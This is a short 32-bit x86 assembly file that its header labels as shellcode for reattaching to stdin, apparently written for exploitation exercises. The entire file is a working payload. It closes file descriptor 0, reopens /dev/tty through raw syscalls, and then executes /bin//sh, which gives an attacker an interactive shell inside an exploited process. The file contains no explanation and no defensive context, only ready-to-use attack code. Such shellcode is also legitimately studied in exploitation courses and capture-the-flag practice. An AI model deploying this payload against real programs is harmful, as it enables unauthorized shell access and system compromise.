	;; Shellcode that will reattatch to stdin
	;; Evan Jensen (wont) 111012
BITS 32
	global main
	
main:
close:
	xor eax,eax
	xor ebx,ebx
	mov al,6
	int 0x80
tty:
	push ebx
	push 0x7974742f
	push 0x7665642f
	mov ebx,esp
	xor ecx,ecx
	mov cl,2
	mov al,5
	int 0x80
sh:	
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	xor edx,edx
	xor ecx,ecx
	mov al,11
	int 0x80
